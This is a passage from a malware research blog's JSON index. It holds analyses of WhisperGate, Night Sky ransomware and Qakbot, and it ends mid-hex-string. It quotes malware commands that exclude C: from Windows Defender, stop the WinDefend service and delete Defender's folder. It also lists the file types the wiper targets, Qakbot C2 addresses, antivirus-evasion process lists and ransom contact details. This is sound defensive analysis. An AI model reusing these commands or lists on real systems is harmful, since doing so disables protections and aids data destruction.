We need to do this dynamically. . Analysis and Unpacking . Open module in dnspy | Right click assembly Edit Module... | Change Module Type to Windows and add Ylfwdwgmpilzyaph as the Managed Entry Point. | File -&gt; Save Module | Open saved module in dnspy | Locate call to EazFusactor vm in entrypoint u0005 u2005 u2000. u000E u2005 u2000(). u0002( u0005 u2005 u2000. u000F u2005 u2000(), &quot;#6k@H!uq=A&quot;, null); . | Press ctrl+f to open find and search for .invoke | When you find the function with the two invokes on the entrypoint &quot;call&quot; put a breakpoint on them.return u0002.Invoke( u0003, u0005); return ((ConstructorInfo) u0002).Invoke(BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic, null, u0005, null) . | Start debugger | . The concept behind this method is that Eazfuscator uses the invoke each time it calls into a virtualized function. By putting a breakpoint here we can monitor and intercept the arguments for each call. Each time we break we can inspect the arguments then run until we break again at the next call. . Functionality . The sample checks if it is running as admin, if it isn&#39;t it will launch itself again elevated and teminate. | The sample drops a VBS script %TEMP% Nmddfrqqrbyjeygggda.vbs that attempts to exclude C: from Windows Defender CreateObject(&quot;&quot;WScript.Shell&quot;&quot;).Run &quot;&quot;powershell Set-MpPreference -ExclusionPath &#39;C: &#39;&quot;&quot;, 0, False . | Drops AdvancedRun.exe in %TEMP% (SHA256: 29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b) | Attempts to stop Windows Defender /EXEFilename C: Windows System32 sc.exe /WindowState 0 /CommandLine &quot;&quot;stop WinDefend&quot;&quot; /StartDirectory &quot;&quot;&quot;&quot; /RunAs 8 /Run /EXEFilename C: Windows System32 WindowsPowerShell v1.0 powershell.exe /WindowState 0 /CommandLine &quot;&quot;rmdir &#39;C: ProgramData Microsoft Windows Defender&#39; -Recurse&quot;&quot; /StartDirectory &quot;&quot;&quot;&quot; /RunAs 8 /Run . | Copy InstallUtil.exe into %TEMP% and launch it | Unpack Stage4 which is reversed and gzipped | Inject Stage4 into InstallUtil.exe | . Helpful Eazfuscator Concepts . Create EXE From Assembly (Add Entrypoint) . . Add Function Call Breakpoint To EazFusactor . . Stage 4 - File Corruptor (Final) . This is a 32bit native Windows binary that has been compiled with MinGW. . Functionality . Use GetLogicalDrives and interate through drives selecting FIXED and REMOTE drives | Recursively iterate through files in all directories except for %HOMEDRIVE% Windows | Compare the file extension against a list of target file extensions | For matching files replace the file contents with 0x100000 byes of xcc | Append a random hex integer to the corrupted file name | . File Extension target list . cmd .HTML .HTM .SHTML .XHTML .PHTML .PHP .JSP .ASP .PHPS .PHP5 .ASPX .PHP4 .PHP6 .PHP7 .PHP3 .DOC .DOCX .XLS .XLSX .PPT .PPTX .PST .OST .MSG .EML .VSD .VSDX .TXT .CSV .RTF .WKS .WK1 .PDF .DWG .ONETOC2 .SNT .JPEG .JPG .DOCB .DOCM .DOT .DOTM .DOTX .XLSM .XLSB .XLW .XLT .XLM .XLC .XLTX .XLTM .PPTM .POT .PPS .PPSM .PPSX .PPAM .POTX .POTM .EDB .HWP .602 .SXI .STI .SLDX .SLDM .BMP .PNG .GIF .RAW .CGM .SLN .TIF .TIFF .NEF .PSD .AI .SVG .DJVU.SH .CLASS .JAR .BRD .SCH .DCH .DIP .PL .VB .VBS .PS1 .BAT .CMD .JS .ASM .H .PAS .CPP .C .CS .SUO .ASC .LAY6 .LAY .MML .SXM .OTG .ODG .UOP .STD .SXD .OTP .ODP .WB2 .SLK .DIF .STC .SXC .OTS .ODS .3DM .MAX .3DS .UOT .STW .SXW .OTT .ODT .PEM .P12 .CSR .CRT .KEY .PFX .DER .OGG .RB .GO .JAVA .INC .WAR .PY .KDBX .INI .YML .PPK .LOG .VDI .VMDK .VHD .HDD .NVRAM .VMSD .VMSN .VMSS .VMTM .VMX .VMXF .VSWP .VMTX .VMEM .MDF .IBD .MYI .MYD .FRM .SAV .ODB .DBF .DB .MDB .ACCDB .SQL .SQLITEDB .SQLITE3 .LDF .SQ3 .ARC .PAQ .BZ2 .TBK .BAK .TAR .TGZ .GZ .7Z .RAR .ZIP .BACKUP .ISO .VCD .BZ .CONFIG .",
            "url": "https://research.openanalysis.net/whispergate/malware/2022/01/20/whisper_gate.html",
            "relUrl": "/whispergate/malware/2022/01/20/whisper_gate.html",
            "date": " • Jan 20, 2022"
        }
        
    
  
    
        ,"post7": {
            "title": "Night Sky Ransomware",
            "content": "Overview . Sample (packed): 8c1a72991fb04dc3a8cf89605fb85150ef0e742472a0c58b8fa942a1f04877b0 . Sample (dumped/unpacked): 1fca1cd04992e0fcaa714d9dfa97323d81d7e3d43a024ec37d1c7a2767a17577 . References: . First seen from MalwareHunterTream | Sample VT | Sample Malshare | Malware Bazaar | id-ransomware | . Dynamic Analysis . Drops hta ransom note in every directory (NightSkyReadMe.hta) | Uses .nightsky file extension for encrypted files | . Unpacking . The sample is packed with some version of VMProtect, likely a newer version (3?) but I&#39;m unsure. It seems to have some anti-debug that actually works against ScyllaHide but luckily it will run with a debugger attached. MrExodia confirmed that the entrypoint was virutalized but we discovered that the main funcationlity was not. This allowed us to break in the main functionality and use vmpdump to dump the payload and resolve the imports. . Static Analysis . The code is strightforward but it contains a statically linked mbedtls library. To assist with reverse engineering we used lumina to pull down some function names for the mbedtls functions, and we compiled version 3.0.0 of mbedtls and imported the .pdb file to give us access to the library structs in IDA. . OSINT . It seems as though this might be a updated version of Rook Ransomware (January 8, 2022). Many researchers are spreading something what is not true.. Please repair your analytical conclusions.#Rook #ransomware is basically previous version of new #NightSky - delivered VMProtected (will be shared later).Facts about #Rook in pictures!!!@malwrhunterteam@cPeterr pic.twitter.com/63bTaWDDmp . &mdash; Jiří Vinopal (@vinopaljiri) January 9, 2022 &gt; Many researchers are spreading something what is not true.. Please repair your analytical conclusions. #Rook #ransomware is basically previous version of new #NightSky - delivered VMProtected (will be shared later). Facts about #Rook in pictures!!! . . . . Dynamically Extracted IOCs . RSA Public Keys . --BEGIN PUBLIC KEY-- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwetDt+9kp5JJGCb3YrqH 48g0rxFIaj5/NjMBvxtpa+7nO/lS0FQXxWJO78dTT6xW/UgVLPK4MvbGeIj17aQF SqGHbRxTeoPrHufp4sM4J2IQYLc6YLYZMS6XT02rHOjumBJpEKyROQ+df5KU/06o Rrhljc0Qco+qW8q/xYJQ9VFa87IJM6WM3wsydHVDDeGuWi4/PMUT4/GAa8/WMUYW 9Ebw7/hXd/aNX5LykeonN+nkJfbj1fZNTU81tc8Kx4rykLvMVE1H3AaT5ssCBt7p AFkLLjplOXz3XmhH+J5vm5Ifi7T85j4D6O03qocO2gwezIikCDU2YAOOpJzkb5Ab +wIDAQAB --END PUBLIC KEY-- . --BEGIN PUBLIC KEY-- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnw/AqzVYc7H6A34K3MQ6 J8nJeaCSegiSOIjhxveQeocKp6TzvL6W3usuMbJKGfL9b19KkiYYyK0WAJ/gsIpq DH7xLCeOq8Lttp07PJmpyOLzzSyuSRKY3E7uSATXMzvJq4OuIkAcwWdce8OnQfS0 17VxNISQU6XQMjt81sqHTzvmg3DaeoqGb1oISWyDoRMFd5Akt04Iw//aNIoGIBvh e/HP71LQpbyzb0RY0HBQuk3zlIDK6J5Hvr+Bkd4Tr5oh/oBya6RX7gW5t1FkY42c /maunB4PiPgHiPdHtJ1LQE+EtSLWU4ZCc0finaLBh3ooySIcsLP9ehlWds1h1ZWN 2QIDAQAB --END PUBLIC KEY-- . TODO: Why are there two RSA keys? . Ransom Note IOCs . Contact information Web Chat: You can use the username and password provided by us to login to the chat room to communicate with us. URL:https://contact.nightsky.cyou username:user-kdwckin password:kdjfikerjijJHDUFIGjk3289 Email: You can contact us by email. EMAIL ADDRESS:akij@nightsky.cyou -- Data release website Where we use to disclose the data of customers who do not pay http://gg5ryfgogainisskdvh4y373ap3b2mxafcibeh2lvq5x7fx76ygcosad.onion -- Remark How to access dark web sites:https://www.youtube.com/watch?v=NpXEQHDOA5o . Mutex . The mutex tset123155465463213 is used to prevent multiple cuncurrent versions of the ransomware. This might be a nice vaccine? . Encryption . TODO .",
            "url": "https://research.openanalysis.net/vmprotect/night%20sky/ransomware/malware/2022/01/06/nightsky_ransomware.html",
            "relUrl": "/vmprotect/night%20sky/ransomware/malware/2022/01/06/nightsky_ransomware.html",
            "date": " • Jan 6, 2022"
        }
        
    
  
    
        ,"post8": {
            "title": "Qakbot / Qbot",
            "content": "Overview . Sample (unpacked): 670e990631c0b98ccdd7701c2136f0cb8863a308b07abd0d64480c8a2412bde4 . References: . Unpacked Sample - Malshare | Malware Bazaare | AGDC Config Extractor Tutorial | Malpedia Articles | UnpacMe | . Expected C2 Config . The following are c2 IPs that we expect to be in the config based on our sandbox output. . 32.221.229.7:443 140.82.49.12:443 24.152.219.253:995 182.56.99.126:443 76.169.147.192:32103 218.101.110.3:995 89.101.97.139:443 82.152.39.39:443 176.24.150.197:443 96.37.113.36:993 68.186.192.69:443 59.88.168.108:443 75.110.250.187:443 182.191.92.203:995 89.165.88.95:443 103.142.10.177:443 45.9.20.200:2211 24.95.61.62:443 194.36.28.26:443 78.101.82.198:2222 37.211.157.100:61202 70.163.1.219:443 31.215.99.73:443 103.143.8.71:6881 59.6.7.83:61200 63.153.187.104:443 14.96.79.22:61202 93.48.80.198:995 24.53.49.240:443 94.200.181.154:995 149.135.101.20:443 24.178.196.158:2222 209.210.95.228:32100 78.101.82.198:443 67.209.195.198:443 96.80.109.57:995 80.14.196.176:2222 38.70.253.226:2222 24.222.20.254:443 217.165.123.47:61200 74.15.2.252:2222 217.128.93.27:2222 102.65.38.67:443 190.73.3.148:2222 79.167.192.206:995 95.5.133.68:995 114.79.148.170:443 120.150.218.241:995 186.64.87.213:443 65.100.174.110:443 96.21.251.127:2222 136.232.34.70:443 63.143.92.99:995 136.143.11.232:443 39.49.27.10:995 111.125.245.116:995 41.228.22.180:443 217.164.247.241:2222 83.110.107.123:443 76.25.142.196:443 74.5.148.57:443 65.128.74.102:443 67.165.206.193:993 173.21.10.71:2222 71.74.12.34:443 94.60.254.81:443 23.233.146.92:443 73.151.236.31:443 79.160.207.214:443 213.120.26.24:443 89.137.52.44:443 75.188.35.168:443 109.12.111.14:443 106.51.48.170:50001 68.204.7.158:443 78.101.82.198:995 80.6.192.58:443 41.96.250.164:995 114.79.145.28:443 188.54.96.91:443 105.198.236.99:995 50.238.6.36:443 65.100.174.110:8443 70.51.134.181:2222 117.248.109.38:21 86.98.53.83:443 182.176.180.73:443 217.165.11.65:61200 103.143.8.71:995 50.237.134.22:995 187.189.86.168:443 100.1.119.41:443 2.178.67.97:61202 86.198.237.51:2222 88.253.171.236:995 73.171.4.177:443 40.134.247.125:995 72.252.201.34:995 190.39.205.165:443 187.172.146.123:443 92.167.4.71:2222 189.30.244.252:995 105.111.124.76:443 84.199.230.66:443 14.96.67.177:443 182.56.57.23:995 87.70.93.215:443 93.48.58.123:2222 73.5.119.219:443 75.169.58.229:32100 173.71.147.134:995 69.46.15.180:443 23.82.128.108:443 5.36.7.212:443 200.75.131.234:443 82.77.137.101:995 187.201.90.81:443 24.55.112.61:443 201.172.31.95:443 216.238.72.121:443 216.238.71.31:995 207.246.112.221:443 207.246.112.221:995 216.238.72.121:995 216.238.71.31:443 27.223.92.142:995 24.229.150.54:995 117.198.149.221:443 . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . String Tables . key = unhex(&#39;efb05bc91c9c83400d08dd5087959b8b72a7a75b36b8d290c42ddbc22d292414ed86a03f3672a15b8da8bae6c737a55506eb623c9735a5fb41f213f30e4816fc32d9c4ecf873b394b869545cc2f382562e46cad089290ba543bd0000a990b9399a24d735&#39;) data = unhex(&#39;8cdf29ac4ff9f136646bb803eff0f7e75cc2df3e0de8b1f38a7996ad4307416c88bdee6b6426f238ecc69483bf52a51844aa2f6ff247d39222973d96762d2d9150b8a98b8d1a9df1c00c5479918af1224b2b98bfe65d2ef910c49ce7149e2aa8df257578b13ff5f0e9a517dfc25b7bcb9fe08143bcec48514114bec9e66b6133f31ed1e5d385b558d63a609f3e71fe56d794329d75872e0978885bb4a5808f12c1f1e42c2c3fae86f13f4128b98cd9487fcd30bdb8f2119655dbcd0f5f4ddd3df7e7b5ef1ecba71759dbb3fc8842acc24f4d457388e8d411530ac460fbdbc983b5418b307e8e594ae446c0893782639f202d6e9932b8b29cd616cbf18302352ab681e32f0023b2b5896a31f90af3bbf509875dd0df1f526db020f3ec9be81fc3893e4eddd2c38b6b8f956c7b6148bae9d70902419315e2ccdfba8a5ec62769980d5ae369f2922f967c847d68529954bcaa889d01efc7c8103a39b6f3de0a001abab9f94c57a53898df8203ec2caedb653d3a8575b7a7c3a6579795031388e0c8e908ebf0750c1426b5ab850f042a846bbff097c3f705fd7036d93a19a707fdde71c04bd63e7a4ed902eb9c91f804d1fe960e3b5cec90e4312e16abb3e2486cc030bd86c033a56cfdf329236cb13c87fcf6ea15c2882b5cc8b7f7c40888bb5e5d4179bfe9cf4b132ef222fefff5b1f103f91a688e264efe43c0a824866683202d6e99328ead82cb41ecc4d6391132b69af62f2e33b9b5fb1a398b27d183b07e9a65eff725605ab23ff3b0c7d80bd4d33e5b8be0cca95ea9a3034c5c71edd1f26c775cc423e8a8cc84b437c62665990b4ce31bc08324f276947b2138994abcff899301ddbadd11315c84b2ce056b46e4b4e5450bd120cd8bc536b932f9fb25367fb43ee3e0f6fb5cc2df3e0ddda6f8a15fbea34107416c88bdd7564417d233ecdad1c8a24fc06e639f1659e556c48b6f976b96353a628f5cb0a28ad616cbf18319353fa996f6354f36bea5fb4c25c03bd8d4d33ab968e9f125636da97ee2edfe8b11d5de2b428be0bea041b7c26c656841bec3f26c6620ee1dc4e4ffe6b45fc922679b0b12f359c9fb329767867e2966951cbda880f805d8fdcb0c7a39ba96b93f5d23b9a2ff076edd26868cdd3fa87bf9ed34236da53587a4a9b84692916c0e81e290a55bbca15e5b526cc3e3d85a0d13d73cfeded99ee952dd303d8a145bf446d78d20dc768b6b48798c57b7c498c556c0b4cc003939ffa8a7661c22f0f5b91b6f9f668dddd476ec2caee76f2838ef34a8b0ffd672f4d2395bd1a6c3a540abae485a677b83f5c5514272f632e3dbce87f737e627638a16599710f6823286769e5c277988178597958b24fcc38e5d0839ba83ee395c23b8feec516ea566eec1956bff789ca96f2708b033f4fdf2ee1ec3893e4eddd2f1b45db7ab4e48507d82e88f471b01c934eec3cd87b15288336a8a11549766eabd15a552a14b14419345eff0dfca3ddcf0dd351935a181ed254120bef0c8477fcc0edc83c73abb79c0d0307446b82487e2e8b92d94957552d4be90e17ea2b1594c494682e9d41a6a21d828dae7edd0f36bdd226f91034ef31bc08324f261966966738457f985a8bc5391dcf3251900e780a0760120eafffd092ed66392999079ec6fbea36f6928ff75f4b79bf81cdfcf3069dabde2a048a99d4050537a8986f35a4252ce39e7fff7af9452d7236f88071caa15e29e35bd71996b2b62d410aead829514dee0cb53767ce4d3a02d472bbab5fb5a64cb22c986df358579eae62c3061b020e2e7e8e41cc6d33e4b998eccea71fea1424650488eefcd4904508851decdcec6a855cf0574840159e44685c661b57687412a7c9951adecce8f1addf9df04202ff881ed395a1aa9b9e45f399f14d4818369964ceeec23687bae72ae9ffef900f5c22f43cabcb0f90db4a04779567b8ee3d34c1831d33eecdcdfcee512d6772acb0c49fb5989db2f877fdf2e2663901bd9b39c9b12c3badc05385cb196ee334d32ead0de40659671e2acdf36b969e8e6325e71ae24e2f89bd80bd4f014618ee690a240b4ac034c5c71edc7d65e4506f22dee86df9ea237ce3074850750a4078b9f2d9e13d65d31658857b49683970796c8eb102728a79eb164722ba5b2fa5065c66dd897d55ba779e8e230643bef7ee3f9f78b31c8c92f53d6a6bd9054aba7170945649deac95c5706c834e387c2cbb040d27860841051ba40d797249c709c6a2d72fc1789b6839f01d2f9fe003839b1dbfa6e186fef8cc0477fc031d38ac47b8c64ecef2f7f6daf0ceef0e3fb1ec8d53e18ddaaf5c44cbfb44c594d27dfa8c4535a72f214cbfceda79572f9186f881053e45ac38f1da57a9d6a27618f129da18a9d1dd7f1ca351124a19ff7254729a4a3d5796ad12bceefd36195409ca613747ba935eac7f4e40682fb3e4ec8beffb648a9ec485141148cf5d757591dca23a3ccd68ac712f62c759f0751c55aca8f64ae768b7e24798e57abea898016b3fccc1d242fc2a0ed305a31aba2ec7546cc20cf80c334af689ca6107f67ba22e6f8dde21ec2d47e6af1bce4a15fb5a75909616c9deacf4d5300fd32e8d0ca8aa845c07b6393073cc44cd68f249f20c10e2c61995cbead829d5dd6ecdd52302ba381e9324f23a7bfe7076edd26868bc72ca868ffeb257f26b828e295cce21c94950466d0abe3ad4ebaae604c497b9fffa04b4f02c466bdd09fd6f36fa57055921148f258f7942e8636af5d31658857b4f7dea40bc4fdc2082638ec96fa332e31bea3e859629671938bdc37c932f8e2340d69ae27effaf4e01389c3375ab89ef1b75999ad425d7164b9efcd5a3621e417c8ebeec6ed17e30749a6426bfe5b96c91ea2619c6d2d658f5dabc4a19709daf8d4087b69ecc3a27e792fa4b4e65e78850de9cf8675f827bcf136373fea7eb7bcbbcc17c4cc34198ae2a1f41deaf21c09627d9fe3c6504e5d966ca398bab1ae59966759bb1053f450d68841a57a9d3d7a49b85baaafa88a1ac5f1b8273531a7f3e4254629b9a4ec5b38976dd897d55b9a6ce5cd25795ab820e8e7efe21cc0a7080c909fdcff16959516121f58baafa068673ea138b7f4d28fa552d7336f874c4fee46d68841a15cb55a1f57ae778589859b01dce7d70f20008f9ae1244135a5b6fd094acb37d4a2d137be7deee61c5e78a41ee2e19bd817d3873454d285dd8d7ebeb05b404771cdbb80785306ee39e7cdd992ef15d23c68860551e3469fd961d433d175217b8c57abb7839612c7fdd7071839b496ee6b472bbab5fb5a64cb22c98acd7a9540b2df656e67b224dbf6f2e6049585723cebb7e4e44eb4ae6b4048719ea69d1f5910cb0cc0e1e983b541cc3663c52744f256f48e24806adb2c1b739057bab0ccd253f5e6d704741f8bbedd124f32ab96e0456e8514d58ac23ee952fdee252d35fd77a2e6bca95bade134449897f1a745fbad4f43627d81e380565852c234e1eed38aa244af3a64812455fb508bb82e826adb2c6d65de1bd38a898007b3f5d90c363fa696e73f4821a2b9e04661ce2fd081df34bc6cedf133797da829f1e2e3f20bc6dd5b75d9a2e4ad42b5ee694c57779fefd04b5f1dcf77dbcdd482a845890363991155f85b89b22f8167926224529d46bce8a59600c7f5d4050733b781e1330216abb3e2486cc00ddc82d55b9a65eff725605ab23ff395c8ce3ee2e40f1692f2d6966296e26c47507dbbefd24a4522d334e9ddd992c712f62c759f0751c55aca8f64ae408a7d1f59ab04ed98819711c0edd60a7a39ba9682214728a3beec5d25c12fd1eff334a471fded244161b33587c6dec737e4f37b1c9894c28b60fb9544471726b2c9d05a4413d532e3cfe99fb443c038069c0b52e441c4cb1d9676956f3d7a88328b8ba3ac2ff0ddf53f665c8192f2224729a4d0da664df114fcbdf5078475fff12f7e67bb24dbc2f2e516c8d02816fcb7f6a143bfa75f75776494c8c54b363cf50edeede8c88376f155458a1248fe5acbd7059760907c2166885bb6aac0bc16c5fddb0c1d18eebee3385b20abb3fd5c79c03191a1d136ac30cccd10496dab39e4f0d2cf5ef4c22940d1b1f5e87eafa3595c571483f2c4535a5cc537e1a8eeb49272a50647bd2358fa5ccba82480659a6d2d38994abcffbf9905e0f1ca1f3d3fa7dde72e4b46e4b5f14c0bcc2edc88d574a36cf9e4407a65b433a7e5e9e411c2d42816dbb3fca80db8b048485071cda1c5474613cf3fad8a9fb5e517877055c945369751cc88319e728a40297b9932f9a29e971e9394cd1a312ea79df4784a2aa6d0fc5b67c82cd3c1d437a51cd5ed297961bc3ceeeff2e51587c33a42d9b0f1b748f5ec03294777bef0c37745068f3ef5cdbac3944ed62163863053f84180a7128b60876b2525ce6e96aa89bc01dae2dd3a3128b783ac335623ca92f05d6ee326d38cd575ac64f983176466ee62d8c5e9e416d2c42f36ef81f3b644abb6037a487188f6801a4378f23ef988d584ad60e81c558e104afe56c0db7cd254967a07749657bab0c4da04dafad50e3928b1c9a0760866e8abe0447bc031ce80de3abd75f3ed0c687eb83cbafcf6fb17d5d43458d9a6f5b90c879e0375017782e9d463551bcc2dbf8a93ec9452d1756989086ce55ac69e328133ce2e0f73887dbbae899b079bb6cf003a31a59ef6251434a5bffd7568cc2ecbdd8a0ca072afb11f5d7ab233e2e6e8a95badc22944eab7e4b15fb5e210094b7687d6d2505517d228a3ebc883a643c07d24ce111ebb15cb8e2d9e3fd3603d7ad012b7b180d179e4c7fb1b3d2cb6ddd13a4b23baf0bb193b9549ee8ac47baf6ff3a37d2d4baf35e6e1fec410cdc2384290f0c3a75fb2b259404a73c3c0c9535321d828f9cdd7a9a55dc03672c94b36f146cad505977f967a2d50955ebceccedd0091bdb800393da596ad314720cab1eb4a6fc025da87d931a270f1ed2f7d79af23f3e0edfc0adedd5b44d7bde4987ebea1585b4d6094c5c5514217d3698d8de99fb443c03854840d48b269f68232a55ca4387c4a9141aba5c29d0bd694e41a326eec97ee3a2e27abb2ea4d6ec025da87d932a377f0ee2e6267ad21f5e6effe07d1d0234fc1a8909344b5f11f76667d82f5a01a452ed222fedcdf8bf405f95575830750fb0697d5259e7ff3&#39;) # Create string table function def print_strings_table(strings_key, strings_data): strings_out = [] for i in range(len(data)): strings_out.append(strings_key[i%90] ^ strings_data[i]) strings_table = bytes(strings_out).decode(&#39;latin1&#39;) # Print strings table for s in strings_table.split(&#39; x00&#39;): print(s) print_strings_table(key, data) # Create string lookup function def string_lookup(strings_key, strings_data, offset): strings_out = [] for i in range(len(data)): strings_out.append(strings_key[i%len(key)] ^ strings_data[i]) strings_table = bytes(strings_out)[offset:].decode(&#39;latin1&#39;) return strings_table.split(&quot; x00&quot;)[0] print(&quot; n nString lookup(%d): %s&quot; % (0, string_lookup(key, data, 0))) . coreServiceShell.exe;PccNTMon.exe;NTRTScan.exe MBAMService.exe;mbamgui.exe %SystemRoot% SysWOW64 explorer.exe MsMpEng.exe SOFTWARE Microsoft Microsoft Antimalware Exclusions Paths WBJ_IGNORE mpr.dll LocalLow bdagent.exe;vsserv.exe;vsservppl.exe avp.exe;kavtray.exe C: INTERNAL __empty cmd.exe SOFTWARE Wow6432Node Microsoft Windows Defender Spynet . pipe {%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X} wbj.go .cfg Packages iphlpapi.dll image/pjpeg %SystemRoot% SysWOW64 OneDriveSetup.exe Win32_PnPEntity user32.dll %SystemRoot% System32 msra.exe WRSA.exe vbs cscript.exe egui.exe;ekrn.exe FALSE .dll tcpdump.exe;windump.exe;ethereal.exe;wireshark.exe;ettercap.exe;rtsniff.exe;packetcapture.exe;capturenet.exe crypt32.dll ALLUSERSPROFILE shlwapi.dll setupapi.dll vkise.exe;isesrv.exe;cmdagent.exe 1234567890 avgcsrvx.exe;avgsvcx.exe;avgcsrva.exe open t=%s time=[%02d:%02d:%02d-%02d/%02d/%d] SubmitSamplesConsent Winsta0 Create %SystemRoot% SysWOW64 explorer.exe %S.%06d */* mcshield.exe application/x-shockwave-flash SOFTWARE Wow6432Node Microsoft AntiMalware SpyNet ws2_32.dll %SystemRoot% SysWOW64 xwizard.exe reg.exe ADD &#34;HKLM %s&#34; /f /t %s /v &#34;%s&#34; /d &#34;%s&#34; snxhk_border_mywnd Set objWMIService = GetObject(&#34;winmgmts:&#34; &amp; &#34;{impersonationLevel=impersonate}! . %coot cimv2&#34;) Set objProcess = GetObject(&#34;winmgmts:root cimv2:Win32_Process&#34;) errReturn = objProcess.Create(&#34;%s&#34;, null, nul, nul) wpcap.dll select Win32_ComputerSystem SysWOW64 fmon.exe AvastSvc.exe kernel32.dll %SystemRoot% System32 mobsync.exe netapi32.dll Content-Type: application/x-www-form-urlencoded %ProgramFiles(x86)% Internet Explorer iexplore.exe advapi32.dll SOFTWARE Microsoft Windows Defender Exclusions Paths c: %SystemRoot% explorer.exe aswhookx.dll %SystemRoot% explorer.exe https Software Microsoft %ProgramFiles% Internet Explorer iexplore.exe System32 dwengine.exe;dwarkdaemon.exe;dwwatcher.exe Win32_PhysicalMemory type=0x%04X %SystemRoot% System32 xwizard.exe wtsapi32.dll .dat aswhooka.dll LastBootUpTime SELECT * FROM Win32_Processor Mozilla/5.0 (Windows NT 6.1; rv:77.0) Gecko/20100101 Firefox/77.0 Win32_Process Win32_DiskDrive Name fshoster32.exe SpyNetReporting S:(ML;;NW;;;LW) WQL c: hiberfil.sysss SOFTWARE Microsoft Microsoft AntiMalware SpyNet Set objWMIService = GetObject(&#34;winmgmts:&#34; &amp; &#34;{impersonationLevel=impersonate}! . %coot cimv2&#34;) Set colFiles = objWMIService.ExecQuery(&#34;Select * From CIM_DataFile Where Name = &#39;%s&#39;&#34;) For Each objFile in colFiles objFile.Copy(&#34;%s&#34;) Next aaebcdeeifghiiojklmnooupqrstuuyvwxyyaz Caption,Description,Vendor,Version,InstallDate,InstallSource,PackageName SystemRoot SELECT * FROM AntiVirusProduct %SystemRoot% SysWOW64 mobsync.exe wininet.dll CommandLine SELECT * FROM Win32_OperatingSystem winsta0 default ROOT CIMV2 Caption SOFTWARE Microsoft Windows Defender SpyNet NTUSER.DAT Caption,Description,DeviceID,Manufacturer,Name,PNPDeviceID,Service,Status ntdll.dll TRUE SAVAdminService.exe;SavService.exe .exe image/jpeg wmic process call create &#39;expand &#34;%S&#34; &#34;%S&#34;&#39; displayName from userenv.dll urlmon.dll Initializing database... ccSvcHst.exe %SystemRoot% System32 OneDriveSetup.exe ByteFence.exe Win32_Product WScript.Sleep %u Set objWMIService = GetObject(&#34;winmgmts:&#34; &amp; &#34;{impersonationLevel=impersonate}! . %coot cimv2&#34;) Set objProcess = GetObject(&#34;winmgmts:root cimv2:Win32_Process&#34;) errReturn = objProcess.Create(&#34;%s&#34;, null, nul, nul) WSCript.Sleep 2000 Set fso = CreateObject(&#34;Scripting.FileSystemObject&#34;) fso.DeleteFile(&#34;%s&#34;) image/gif abcdefghijklmnopqrstuvwxyz root SecurityCenter2 %SystemRoot% SysWOW64 msra.exe sf2.dll aabcdeefghiijklmnoopqrstuuvwxyyz Win32_Bios %s system32 shell32.dll String lookup(0): coreServiceShell.exe;PccNTMon.exe;NTRTScan.exe . key = unhex(&#39;09bcba05a9423e4ad9256dea6dd6916dbfd2d242e45801f25905afde20b6f88e34d60f78a26a952d8f646efba3467cc65e11720d1559bfc27de9a9b12b5644a2444f8cbb7423ee77544330eb389f0c8214f4b35399147d1dcda0&#39;) data = unhex(&#39;2ccf9a278d674d6ae40531c848a5cd4f84f2f462c07d72d05975c0a945c48be651ba6356c712f02dfc07068fc23517b570740a683576fcb01888ddd40b7916f7646dc2ef5462bb231c0c62a26cc650d14da7e716d4365d329ee329f3f456fd036c1ef90a39a44df3e44d90868062c67d72d0792ae18e0099be8e67b3631e821ef05efb4428baea0a39827f30530d452bd0a50f88c4f54a2225a20926efc91b5081112043478357fe61eb34dbd23ff5142f78a98041ddce25ff2b4c3e906a56bb289bc46dd1b7a662883762933562ddb155c6f8dd7b905b2fe338d071c20d0d89cc3513a02a4d25647b3dd0b50ec9e7e5771531d0362ae2cf22469c043d2c5eb768ed63e47d98d61ff067091da8d27bd3c825db274d77fe001ecd4db3e31f82f7b662883d6fcf7c70af8d45da9eae40b37c0c8225de038f051c8b836b1dc67c3401516620ccb618849a83772527ca302effd0070d8b0f316110c47bed69e36091937ccb415d3f83f429fdef51e10d6c038d7c31b93485c528f2f0f26d903621d72a2580aa5296daab47f42f57f129b562c1272bdb8c1c5ce90d455228256bcaf858d99bc40b7901f6646abc890119cb47663630985bf778e3679fc07dfc6c183de2e46cd0df71cc62110cf90a39a44df3e46dcca0a4328b2b75dc3c7dcae546c491ea55fb7811cc00f04efb0b1cd6cb2310b63b635f3e2777daba18d2cfc34232258f3326e2d111409a18266e588e54ef69f039c2877dfc6c181dbfcf7cc8df25d9305724ad25039901b9fe06caa2f26f952d64802071d6ae458bb9c278f6220ccb07f042fa1053ca936623aa3a7002234a2ddcb2538dca9f743b37c6273ca29e0723801b2026439f18b068ed7995da3dc6600f68bed47a9c9564c52e613eab501e9e1ed6a4558ee0d271d36938f27769c1b520d89dfa47a26e0c8247fb4ce0640dc1ff160ea9396313605138cba37d88dd9f4e2e2182613ab69e0103cc52276110c4719f50d16d87c736f4274f419ac967d8d572da12513dbc573e8208bafd31c9e3fc72b8286e853c77dcb645da94a051ae6a78c307e659fd010f968d2210aa5e7f1779352fd6a70ac986d0473a44d33326e2c80042ee52276315db0ce722a761d49663ad6c5338b8807bd9c93f89674d6aaa4005b519b3e21985f2f737c43b6e9c2a71dc8154d38bfa0ef62a1c821cf849ea100b98d72318fc7e34162d762bdaa3098cd9c3443521d13775ac9e10238d1a30631f8818ec69f614d49c30b9641473aa8e6cc4df25842c1e7cf9145fdd43e6bf5d91e3f264c478758b29608ffc05c5a4dd4da57b1dcf59a771ec0502988d2304a37c314c2d377ccce07db5fac8582221cf777dd0ec1d4d8a18233060844ffa7ed17c91df3fc5624c33fdfc79d3cd60db31562fb549438f15b3913ef0948615a50a44ae146cccac4fc597e8408a5811cc0efa5afc382d8ed13419a82a47177f6630d0ac21bbdcdf2b3c0cda253cf8ff17479d5e3b0e53d652e964b56390e63be1770e79b99209ddc871c0245f29ad0b089208edfc01c8a08d3189286dc92a64c2ae4cd3c3fd55b86b1acd12ae4efa070594cc6b47b03763077e150fd6b0099cc8dd2b0636cd2226e0d